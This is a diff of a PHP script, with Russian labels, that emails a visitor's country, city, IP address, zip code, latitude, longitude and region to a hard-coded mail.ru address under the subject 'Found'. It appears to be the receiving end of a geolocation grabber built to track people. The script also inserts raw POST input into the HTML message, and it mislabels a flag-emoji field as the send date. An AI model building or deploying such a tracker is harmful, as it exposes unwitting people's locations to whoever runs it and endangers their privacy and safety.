@@ -1,22 +1,25 @@
 <?php
-$to  = 'err.not.founds@mail.ru';  // обратите внимание на запятую
+ $to = 'err.not.founds@mail.ru';
+    $subject = 'Найден';
+    $message = '
+            <html>
+                <head>
+                    <title>'.$subject.'</title>
+                </head>
+                <body>
+                    <p>Страна: '.$_POST['country_name'].'</p>
+                    <p>Город: '.$_POST['city'].'</p>
+                    <p>ip: '.$_POST['ip'].'</p>
+                    <p>Используемый протокол перелачи: '.$_POST['type'].'</p>
+                    <p>zip-код: '.$_POST['zip'].'</p>
+                    <p>Широта: '.$_POST['latitude'].'</p>
+                    <p>Долгота: '.$_POST['longitude'].'</p>
+                    <p>Имя региона: '.$_POST['region_name'].'</p>
+                    <p>Дата отправки : '.$_POST['location.country_flag_emoji_unicode'].'</p>
 
-$subject = 'Нашли человека ' . $_POST['country_name'];
-
-$message = 'Страна - ' . $_POST['country_name'] . '<br />;
-'Город - ' . $_POST['city'] . '<br />;
-'ip - ' . $_POST['ip'] . '<br />;
-'Используемый протокол перелачи - ' . $_POST['type'] . '<br />;
-'zip-код - ' . $_POST['zip'] . '<br />;
-'Широта - ' . $_POST['latitude'] . '<br />;
-'Долгота - ' . $_POST['longitude'] . '<br />;
-'Имя региона - ' . $_POST['region_name'] . '<br />;
-'Дата отправки - ' . $_POST['location.country_flag_emoji_unicode'] . '<br />;
-
-$headers  = 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-
-$headers .= 'To: Anonymous <err.not.founds@mail.ru>' . "\r\n"; // Свое имя и email
-
-mail($to, $subject, $message, $headers);
+                </body>
+            </html>';
+    $headers  = "Content-type: text/html; charset=utf-8 \r\n";
+    $headers .= "From: Отправитель <from@example.com>\r\n";
+    mail($to, $subject, $message, $headers);
 ?>
